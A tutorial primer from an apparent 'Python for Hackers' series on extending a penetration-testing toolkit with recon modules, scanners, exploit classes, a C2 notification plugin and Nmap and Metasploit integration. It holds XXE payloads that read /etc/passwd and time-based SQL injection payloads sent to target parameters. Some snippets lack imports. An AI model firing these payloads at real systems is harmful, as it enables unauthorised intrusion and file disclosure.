# Primer 4: Toolkit Customization & Extension

## Building Your Own Tools and Modules

This primer teaches you how to customize and extend the Python for Hackers toolkit to fit your specific needs. You'll learn to create new modules, add functionality, and build your own tools.

---

## Table of Contents

1. [Understanding the Architecture](#understanding-the-architecture)
2. [Creating Custom Modules](#creating-custom-modules)
3. [Extending Existing Classes](#extending-existing-classes)
4. [Adding New Exploit Types](#adding-new-exploit-types)
5. [Creating Custom C2 Modules](#creating-custom-c2-modules)
6. [Building Your Own Tools](#building-your-own-tools)
7. [Integration with Other Tools](#integration-with-other-tools)
8. [Testing Your Extensions](#testing-your-extensions)
9. [Packaging Your Custom Toolkit](#packaging-your-custom-toolkit)

---

## Understanding the Architecture

### Core Design Patterns

The toolkit follows several key design patterns:

```python
# 1. Singleton Pattern (used in Config and Logger)
class Config:
    _instance = None
    _config = None
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance

# 2. Factory Pattern (used in Exploit Manager)
class ExploitFactory:
    @staticmethod
    def create_exploit(exploit_type, target, **kwargs):
        if exploit_type == 'sql_injection':
            return SQLInjectionExploit(target, **kwargs)
        elif exploit_type == 'command_injection':
            return CommandInjectionExploit(target, **kwargs)

# 3. Strategy Pattern (used in Obfuscation)
class ObfuscationStrategy:
    def encode(self, data):
        raise NotImplementedError

class Base64Strategy(ObfuscationStrategy):
    def encode(self, data):
        return base64.b64encode(data.encode()).decode()

# 4. Template Pattern (used in Exploit Base)
class Exploit:
    def exploit(self):
        self._pre_exploit()
        result = self._execute()
        self._post_exploit()
        return result
```

### Module Structure Template

```python
#!/usr/bin/env python3
"""
module_template.py - Template for creating new toolkit modules
"""

import sys
import os
import logging
from typing import Dict, List, Optional, Any
from datetime import datetime

# Import core utilities
try:
    from utils.config import config
    from utils.logger import logger
except ImportError:
    print("[-] Required utilities not found")
    sys.exit(1)

class YourModule:
    """
    Main class for your module
    """
    
    def __init__(self, config: Dict = None):
        """
        Initialize the module
        
        Args:
            config: Configuration dictionary
        """
        self.config = config or {}
        self.name = "Your Module"
        self.version = "1.0.0"
        
        # Setup logging
        self.logger = logger.getChild(self.name)
        
        # Load configuration
        self._load_config()
        
    def _load_config(self):
        """Load module-specific configuration"""
        self.verbose = self.config.get('verbose', False)
        self.timeout = self.config.get('timeout', 30)
        
    def run(self, target: str) -> Dict:
        """
        Main execution method
        
        Args:
            target: Target to operate on
            
        Returns:
            Results dictionary
        """
        self.logger.info(f"Running {self.name} on {target}")
        
        results = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'module': self.name,
            'version': self.version,
            'status': 'pending'
        }
        
        try:
            # Your logic here
            results['status'] = 'success'
            results['data'] = self._process(target)
        except Exception as e:
            self.logger.error(f"Error: {e}")
            results['status'] = 'error'
            results['error'] = str(e)
        
        return results
    
    def _process(self, target: str) -> Dict:
        """
        Process the target
        
        Args:
            target: Target to process
            
        Returns:
            Processed data
        """
        # Implement your logic here
        return {'message': f"Processed {target}"}
    
    def get_info(self) -> Dict:
        """Get module information"""
        return {
            'name': self.name,
            'version': self.version,
            'description': 'Your module description'
        }

def main():
    """Command-line entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Your Module")
    parser.add_argument('target', help='Target to process')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    module = YourModule({'verbose': args.verbose})
    results = module.run(args.target)
    
    print(results)

if __name__ == "__main__":
    main()
```

---

## Creating Custom Modules

### Module 1: Subdomain Enumeration

Create a new module for subdomain discovery:

#### File: `~/hacking-toolkit/recon/subdomain_enum.py`

```python
#!/usr/bin/env python3
"""
subdomain_enum.py - Subdomain enumeration module
"""

import sys
import socket
import dns.resolver
import threading
import queue
from typing import List, Dict
from concurrent.futures import ThreadPoolExecutor

# Import base module template
class SubdomainEnumerator:
    """Enumerate subdomains for a given domain"""
    
    def __init__(self, domain: str, wordlist: List[str] = None, threads: int = 50):
        self.domain = domain
        self.threads = threads
        self.wordlist = wordlist or self._default_wordlist()
        self.results = []
        self.queue = queue.Queue()
        self.lock = threading.Lock()
        
    def _default_wordlist(self) -> List[str]:
        """Default subdomain wordlist"""
        return [
            'www', 'mail', 'ftp', 'admin', 'dev', 'stage', 'test',
            'api', 'app', 'blog', 'shop', 'store', 'support', 'help',
            'docs', 'download', 'media', 'images', 'video', 'audio',
            'secure', 'login', 'dashboard', 'panel', 'portal',
            'vpn', 'remote', 'office', 'internal', 'private'
        ]
    
    def _resolve_subdomain(self, subdomain: str) -> Optional[str]:
        """Resolve a subdomain to IP"""
        try:
            ip = socket.gethostbyname(f"{subdomain}.{self.domain}")
            return ip
        except:
            return None
    
    def _worker(self):
        """Worker thread for resolving subdomains"""
        while True:
            try:
                subdomain = self.queue.get(timeout=1)
                ip = self._resolve_subdomain(subdomain)
                if ip:
                    with self.lock:
                        self.results.append({
                            'subdomain': subdomain,
                            'ip': ip
                        })
                        print(f"[+] {subdomain}.{self.domain} -> {ip}")
                self.queue.task_done()
            except queue.Empty:
                break
            except Exception as e:
                print(f"[-] Error: {e}")
                self.queue.task_done()
    
    def enumerate(self) -> List[Dict]:
        """Enumerate subdomains"""
        print(f"[*] Enumerating subdomains for {self.domain}")
        print(f"[*] Wordlist: {len(self.wordlist)} entries")
        print(f"[*] Threads: {self.threads}")
        
        # Fill queue
        for subdomain in self.wordlist:
            self.queue.put(subdomain)
        
        # Start workers
        workers = []
        for _ in range(min(self.threads, len(self.wordlist))):
            worker = threading.Thread(target=self._worker)
            worker.daemon = True
            worker.start()
            workers.append(worker)
        
        # Wait for completion
        self.queue.join()
        
        # Wait for workers
        for worker in workers:
            worker.join(timeout=2)
        
        return self.results

def main():
    """Command-line entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Subdomain Enumerator")
    parser.add_argument('domain', help='Domain to enumerate')
    parser.add_argument('-t', '--threads', type=int, default=50, help='Threads')
    parser.add_argument('-w', '--wordlist', help='Custom wordlist file')
    
    args = parser.parse_args()
    
    # Load wordlist if provided
    wordlist = None
    if args.wordlist:
        with open(args.wordlist, 'r') as f:
            wordlist = [line.strip() for line in f if line.strip()]
    
    enumerator = SubdomainEnumerator(args.domain, wordlist, args.threads)
    results = enumerator.enumerate()
    
    print(f"\n[*] Found {len(results)} subdomains")
    for result in results:
        print(f"  {result['subdomain']}.{args.domain}: {result['ip']}")

if __name__ == "__main__":
    main()
```

### Module 2: Custom Exploit Scanner

Create a custom exploit scanner:

#### File: `~/hacking-toolkit/exploit/custom_scanner.py`

```python
#!/usr/bin/env python3
"""
custom_scanner.py - Custom vulnerability scanner
"""

import requests
import threading
from typing import List, Dict

class CustomScanner:
    """Custom vulnerability scanner"""
    
    def __init__(self, target: str, timeout: int = 10):
        self.target = target
        self.timeout = timeout
        self.findings = []
        self.lock = threading.Lock()
        
    def check_headers(self) -> Dict:
        """Check security headers"""
        try:
            response = requests.get(self.target, timeout=self.timeout)
            headers = response.headers
            
            security_headers = {
                'X-Frame-Options': 'Clickjacking protection',
                'X-XSS-Protection': 'XSS protection',
                'Content-Security-Policy': 'CSP',
                'Strict-Transport-Security': 'HSTS',
                'X-Content-Type-Options': 'MIME sniffing'
            }
            
            results = {}
            for header, description in security_headers.items():
                if header in headers:
                    results[header] = {'present': True, 'value': headers[header]}
                else:
                    results[header] = {'present': False, 'description': description}
            
            return results
        except:
            return {}
    
    def check_common_paths(self, paths: List[str]) -> List[Dict]:
        """Check for common paths"""
        findings = []
        
        for path in paths:
            try:
                url = f"{self.target.rstrip('/')}/{path.lstrip('/')}"
                response = requests.get(url, timeout=self.timeout, allow_redirects=False)
                
                if response.status_code in [200, 301, 302, 403]:
                    findings.append({
                        'path': path,
                        'status': response.status_code,
                        'size': len(response.content)
                    })
            except:
                continue
        
        return findings
    
    def scan(self) -> Dict:
        """Perform full scan"""
        results = {
            'target': self.target,
            'headers': self.check_headers(),
            'discovered_paths': [],
            'vulnerabilities': []
        }
        
        # Check common paths
        common_paths = [
            'admin', 'login', 'backup', 'config', 'phpmyadmin',
            'wp-admin', 'cpanel', 'webmail', 'test', 'dev'
        ]
        results['discovered_paths'] = self.check_common_paths(common_paths)
        
        return results

def main():
    import argparse
    parser = argparse.ArgumentParser(description="Custom Scanner")
    parser.add_argument('target', help='Target URL')
    args = parser.parse_args()
    
    scanner = CustomScanner(args.target)
    results = scanner.scan()
    
    print("\n=== Scan Results ===")
    print(f"Target: {results['target']}")
    print("\nHeaders:")
    for header, data in results['headers'].items():
        if data['present']:
            print(f"  ✓ {header}: {data['value']}")
        else:
            print(f"  ✗ {header}: {data.get('description', 'Missing')}")
    
    print("\nDiscovered Paths:")
    for path in results['discovered_paths']:
        print(f"  {path['path']} (Status: {path['status']})")

if __name__ == "__main__":
    main()
```

---

## Extending Existing Classes

### Extending HTTPClient

```python
# Create custom HTTP client with additional features
class CustomHTTPClient(HTTPClient):
    """Extended HTTP client with custom features"""
    
    def __init__(self, base_url: str, custom_header: str = None, **kwargs):
        super().__init__(base_url, **kwargs)
        self.custom_header = custom_header
        
        if custom_header:
            self.set_header('X-Custom', custom_header)
    
    def request_with_retry(self, method: str, url: str, max_retries: int = 3):
        """Request with custom retry logic"""
        for attempt in range(max_retries):
            try:
                response = self.request(method, url)
                if response.status_code < 500:
                    return response
            except:
                if attempt == max_retries - 1:
                    raise
                time.sleep(2 ** attempt)
    
    def parallel_requests(self, urls: List[str]) -> List:
        """Make multiple requests in parallel"""
        from concurrent.futures import ThreadPoolExecutor
        results = []
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(self.get, url) for url in urls]
            for future in futures:
                try:
                    results.append(future.result())
                except:
                    results.append(None)
        
        return results
```

### Extending Exploit Framework

```python
# Add custom exploit type
from exploit_framework import Exploit, ExploitResult

class XXEExploit(Exploit):
    """XML External Entity Injection exploit"""
    
    def __init__(self, target: str, parameter: str, **kwargs):
        super().__init__("XXE Injection", "Tests for XXE vulnerabilities", target, **kwargs)
        self.vulnerability_type = "XXE Injection"
        self.parameter = parameter
        
        self.payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///C:/windows/win.ini">]><root>&test;</root>'
        ]
    
    def exploit(self) -> ExploitResult:
        self.log(f"Testing XXE on {self.target}")
        
        for payload in self.payloads:
            try:
                response = self.client.post(self.target, data={self.parameter: payload})
                
                # Check for file content indicators
                if any(x in response.text.lower() for x in ['root:', 'windows', 'system32']):
                    return ExploitResult(
                        success=True,
                        vulnerability_type=self.vulnerability_type,
                        target=self.target,
                        payload=payload,
                        response=response.text[:500]
                    )
            except:
                continue
        
        return ExploitResult(
            success=False,
            vulnerability_type=self.vulnerability_type,
            target=self.target,
            payload="No payload succeeded"
        )
```

---

## Adding New Exploit Types

### SQL Injection with Time-Based Detection

```python
class TimeBasedSQLInjection(Exploit):
    """Time-based SQL injection detection"""
    
    def __init__(self, target: str, parameter: str, **kwargs):
        super().__init__("Time-Based SQLi", "Time-based SQL injection", target, **kwargs)
        self.vulnerability_type = "Time-Based SQL Injection"
        self.parameter = parameter
        
        self.payloads = [
            f"1' AND SLEEP(5)--",
            f"1' AND pg_sleep(5)--",
            f"1' WAITFOR DELAY '0:0:5'--",
            f"1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
        ]
    
    def exploit(self) -> ExploitResult:
        import time
        
        for payload in self.payloads:
            url = f"{self.target}?{self.parameter}={payload}"
            
            start_time = time.time()
            try:
                self.client.get(url, timeout=10)
            except:
                pass
            elapsed = time.time() - start_time
            
            if elapsed >= 4:  # At least 4 seconds indicates time-based injection
                return ExploitResult(
                    success=True,
                    vulnerability_type=self.vulnerability_type,
                    target=self.target,
                    payload=payload,
                    output=f"Time-based injection confirmed ({elapsed:.2f}s delay)"
                )
        
        return ExploitResult(
            success=False,
            vulnerability_type=self.vulnerability_type,
            target=self.target,
            payload="No time-based injection found"
        )
```

---

## Creating Custom C2 Modules

### C2 Server Plugin

```python
# C2 server plugin for Slack notifications
class SlackC2Plugin:
    """Slack integration for C2 server"""
    
    def __init__(self, webhook_url: str):
        self.webhook_url = webhook_url
        import requests
        self.requests = requests
    
    def on_agent_registered(self, agent_data):
        """Called when agent registers"""
        self._send_notification(f"New agent registered: {agent_data.get('agent_id')}")
    
    def on_task_executed(self, task_data):
        """Called when task is executed"""
        self._send_notification(f"Task executed: {task_data.get('command')}")
    
    def on_result_received(self, result_data):
        """Called when result is received"""
        self._send_notification(f"Result received from {result_data.get('agent_id')}")
    
    def _send_notification(self, message):
        """Send notification to Slack"""
        try:
            self.requests.post(self.webhook_url, json={'text': message})
        except:
            pass

# Usage with C2 Server
# server = C2Server()
# slack_plugin = SlackC2Plugin('https://hooks.slack.com/services/...')
# server.register_plugin(slack_plugin)
```

---

## Building Your Own Tools

### Tool 1: Web Technology Detector

```python
#!/usr/bin/env python3
"""
technology_detector.py - Detect web technologies used by a site
"""

import requests
import re
from html_analyzer import HTMLAnalyzer

class TechnologyDetector:
    """Detect web technologies from a website"""
    
    def __init__(self, url: str):
        self.url = url
        self.technologies = []
        
        self.signatures = {
            'WordPress': ['wp-content', 'wp-includes', 'wp-json'],
            'Drupal': ['drupal', 'Drupal.settings'],
            'Joomla': ['joomla', 'Joomla!'],
            'Bootstrap': ['bootstrap', 'data-toggle'],
            'jQuery': ['jquery', 'jQuery'],
            'React': ['react', 'ReactDOM'],
            'Angular': ['angular', 'ng-'],
            'Vue.js': ['vue.js', 'v-']
        }
    
    def detect(self) -> List[str]:
        """Detect technologies"""
        try:
            response = requests.get(self.url, timeout=10)
            html = response.text
            headers = response.headers
            
            # Check headers
            server = headers.get('Server', '')
            if server:
                self.technologies.append(f"Server: {server}")
            
            powered_by = headers.get('X-Powered-By', '')
            if powered_by:
                self.technologies.append(f"Powered By: {powered_by}")
            
            # Check HTML
            for tech, patterns in self.signatures.items():
                for pattern in patterns:
                    if pattern in html:
                        self.technologies.append(tech)
                        break
            
            # Remove duplicates
            self.technologies = list(set(self.technologies))
            
        except Exception as e:
            print(f"Error: {e}")
        
        return self.technologies

def main():
    import argparse
    parser = argparse.ArgumentParser(description="Technology Detector")
    parser.add_argument('url', help='URL to analyze')
    args = parser.parse_args()
    
    detector = TechnologyDetector(args.url)
    technologies = detector.detect()
    
    print(f"\n[*] Technologies detected on {args.url}:")
    for tech in technologies:
        print(f"  - {tech}")

if __name__ == "__main__":
    main()
```

### Tool 2: SSL Certificate Checker

```python
#!/usr/bin/env python3
"""
ssl_checker.py - Check SSL certificate information
"""

import ssl
import socket
import datetime
from cryptography import x509
from cryptography.hazmat.backends import default_backend

class SSLChecker:
    """Check SSL certificate details"""
    
    def __init__(self, host: str, port: int = 443):
        self.host = host
        self.port = port
        self.cert = None
        
    def get_certificate(self):
        """Get SSL certificate"""
        try:
            context = ssl.create_default_context()
            with socket.create_connection((self.host, self.port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=self.host) as ssock:
                    der_cert = ssock.getpeercert(binary_form=True)
                    self.cert = x509.load_der_x509_certificate(der_cert, default_backend())
            return True
        except Exception as e:
            print(f"Error: {e}")
            return False
    
    def get_info(self) -> Dict:
        """Get certificate information"""
        if not self.cert:
            return {}
        
        info = {
            'subject': self.cert.subject,
            'issuer': self.cert.issuer,
            'not_valid_before': self.cert.not_valid_before,
            'not_valid_after': self.cert.not_valid_after,
            'serial_number': self.cert.serial_number,
            'expires_in_days': (self.cert.not_valid_after - datetime.datetime.now()).days
        }
        
        # Get SANs
        try:
            san = self.cert.extensions.get_extension_for_oid(x509.oid.ExtensionOID.SUBJECT_ALTERNATIVE_NAME)
            info['sans'] = [name.value for name in san.value]
        except:
            info['sans'] = []
        
        return info

def main():
    import argparse
    parser = argparse.ArgumentParser(description="SSL Certificate Checker")
    parser.add_argument('host', help='Host to check')
    parser.add_argument('-p', '--port', type=int, default=443, help='Port')
    args = parser.parse_args()
    
    checker = SSLChecker(args.host, args.port)
    
    if checker.get_certificate():
        info = checker.get_info()
        print(f"\n[*] SSL Certificate for {args.host}:{args.port}")
        print(f"  Subject: {info['subject']}")
        print(f"  Issuer: {info['issuer']}")
        print(f"  Valid From: {info['not_valid_before']}")
        print(f"  Valid Until: {info['not_valid_after']}")
        print(f"  Expires in: {info['expires_in_days']} days")
        if info['sans']:
            print(f"  SANs: {', '.join(info['sans'][:3])}")
    else:
        print("Failed to get certificate")

if __name__ == "__main__":
    main()
```

---

## Integration with Other Tools

### Integration with Metasploit

```python
#!/usr/bin/env python3
"""
metasploit_integration.py - Integrate with Metasploit RPC
"""

import requests
import json

class MetasploitIntegration:
    """Interface with Metasploit RPC API"""
    
    def __init__(self, host: str = 'localhost', port: int = 55553, 
                 username: str = 'msf', password: str = 'password'):
        self.base_url = f"https://{host}:{port}/api/v1"
        self.session = requests.Session()
        self.session.auth = (username, password)
        self.session.verify = False
        
    def login(self) -> bool:
        """Login to Metasploit"""
        try:
            response = self.session.post(f"{self.base_url}/auth/login")
            return response.status_code == 200
        except:
            return False
    
    def get_console(self):
        """Create a new console"""
        response = self.session.post(f"{self.base_url}/console")
        return response.json()
    
    def execute_command(self, console_id: str, command: str) -> str:
        """Execute command in console"""
        response = self.session.post(
            f"{self.base_url}/console/{console_id}/command",
            json={'cmd': command}
        )
        return response.json().get('output', '')

# Usage
msf = MetasploitIntegration()
if msf.login():
    console = msf.get_console()
    output = msf.execute_command(console['id'], 'use auxiliary/scanner/portscan/tcp')
    print(output)
```

### Integration with Nmap

```python
#!/usr/bin/env python3
"""
nmap_integration.py - Parse and use Nmap output
"""

import xml.etree.ElementTree as ET
import subprocess
import json

class NmapParser:
    """Parse Nmap XML output"""
    
    def __init__(self, xml_file: str = None):
        self.xml_file = xml_file
        self.hosts = []
        
    def parse_xml(self, xml_data: str = None):
        """Parse Nmap XML"""
        if xml_data:
            root = ET.fromstring(xml_data)
        elif self.xml_file:
            tree = ET.parse(self.xml_file)
            root = tree.getroot()
        else:
            return
        
        for host in root.findall('host'):
            host_info = {'addresses': [], 'ports': [], 'os': 'Unknown'}
            
            # Get addresses
            for addr in host.findall('address'):
                host_info['addresses'].append({
                    'addr': addr.get('addr'),
                    'type': addr.get('addrtype')
                })
            
            # Get ports
            for port in host.findall('ports/port'):
                port_info = {
                    'port': port.get('portid'),
                    'protocol': port.get('protocol')
                }
                state = port.find('state')
                if state is not None:
                    port_info['state'] = state.get('state')
                service = port.find('service')
                if service is not None:
                    port_info['service'] = service.get('name')
                host_info['ports'].append(port_info)
            
            self.hosts.append(host_info)
    
    def run_scan(self, target: str, ports: str = '1-1000'):
        """Run Nmap scan and parse output"""
        cmd = ['nmap', '-sV', '--open', f'-p{ports}', target, '-oX', '-']
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            self.parse_xml(result.stdout)
        return result.stdout
    
    def to_json(self) -> str:
        """Export results as JSON"""
        return json.dumps(self.hosts, indent=2)
    
    def to_port_scanner_format(self):
        """Convert to toolkit port scanner format"""
        results = []
        for host in self.hosts:
            for addr in host['addresses']:
                for port in host['ports']:
                    results.append({
                        'host': addr['addr'],
                        'port': int(port['port']),
                        'state': port.get('state', 'open'),
                        'service': port.get('service', 'unknown')
                    })
        return results
```

---

## Testing Your Extensions

### Unit Test Template

```python
# test_extensions.py
import unittest
import sys
import os

# Add toolkit to path
sys.path.insert(0, os.path.expanduser('~/hacking-toolkit'))

from recon.subdomain_enum import SubdomainEnumerator
from exploit.custom_scanner import CustomScanner

class TestExtensions(unittest.TestCase):
    
    def test_subdomain_enum(self):
        """Test subdomain enumeration"""
        enumerator = SubdomainEnumerator('example.com')
        results = enumerator.enumerate()
        self.assertIsInstance(results, list)
    
    def test_custom_scanner(self):
        """Test custom scanner"""
        scanner = CustomScanner('https://httpbin.org')
        results = scanner.scan()
        self.assertIn('headers', results)
        self.assertIn('discovered_paths', results)
    
    def test_custom_http_client(self):
        """Test custom HTTP client"""
        from web_attack.http_client import HTTPClient
        
        class TestClient(HTTPClient):
            def custom_method(self):
                return True
        
        client = TestClient('https://httpbin.org')
        self.assertTrue(hasattr(client, 'custom_method'))

if __name__ == '__main__':
    unittest.main()
```

---

## Packaging Your Custom Toolkit

### setup.py

```python
from setuptools import setup, find_packages

setup(
    name="python-hackers-toolkit",
    version="2.0.0",
    description="Custom Python for Hackers Toolkit",
    author="Your Name",
    packages=find_packages(),
    install_requires=[
        'requests>=2.31.0',
        'scapy>=2.5.0',
        'beautifulsoup4>=4.12.2',
        'lxml>=4.9.3',
        'flask>=3.0.0',
        'psutil>=5.9.6',
        'cryptography>=41.0.7',
    ],
    entry_points={
        'console_scripts': [
            'hack-toolkit=main:main',
        ],
    },
    classifiers=[
        'Development Status :: 4 - Beta',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: MIT License',
        'Programming Language :: Python :: 3',
    ],
)
```

### requirements.txt (Extended)

```txt
# Core
requests==2.31.0
scapy==2.5.0
beautifulsoup4==4.12.2
lxml==4.9.3
flask==3.0.0
psutil==5.9.6
cryptography==41.0.7
pyyaml==6.0.1
colorama==0.4.6
rich==13.7.0

# Custom Modules
dnspython==2.4.2
paramiko==3.4.0
pillow==10.1.0
selenium==4.15.0
pyinstaller==6.2.0
pytest==7.4.3
black==23.11.0

# Windows (optional)
pywin32==306
wmi==1.5.1
```

---

## Primer 4 Complete

You now have the knowledge to customize and extend the Python for Hackers toolkit. Build your own tools, add new modules, and adapt the toolkit to your specific needs.

**Key Takeaways:**

1. **Understand the architecture** before extending
2. **Follow the existing patterns** for consistency
3. **Test your extensions** thoroughly
4. **Document your code** for others
5. **Share your contributions** with the community
